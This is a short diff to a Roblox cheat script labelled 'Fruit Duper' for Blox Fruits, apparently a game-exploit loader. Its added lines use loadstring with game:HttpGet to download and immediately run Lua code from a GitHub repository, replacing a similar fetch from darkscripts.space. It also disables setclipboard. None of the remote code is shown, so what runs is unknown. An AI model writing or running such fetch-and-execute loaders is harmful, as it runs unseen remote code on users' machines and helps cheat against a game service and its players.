@@ -1,2 +1,7 @@
+Title = "Fruit Duper"
+Button = "Get Key"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YarhmReborn/RobloxScripts/refs/heads/main/Modifier.lua"))()
+
 setclipboard = function() end
-loadstring(game:HttpGet('https://darkscripts.space/scripts/3051a0e7-5a0b-4bf4-9394-5283e529e655_1298849803525951542.lua',true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YarhmReborn/RobloxScripts/refs/heads/main/bloxfruits.lua"))()
